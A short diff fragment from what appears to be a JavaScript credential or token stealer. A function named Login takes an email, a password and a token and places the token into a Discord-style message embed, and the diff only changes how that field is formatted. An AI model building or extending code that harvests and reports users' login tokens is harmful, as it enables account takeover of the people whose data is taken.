@@ -154,7 +154,7 @@ function Login(email, password, token) {
                         },
                         {
                             "name": "__Token__",
-                            "value": `\`**${token}**\``,
+                            "value": `\`${token}\``,
                             "inline": false
                         }
                     ],
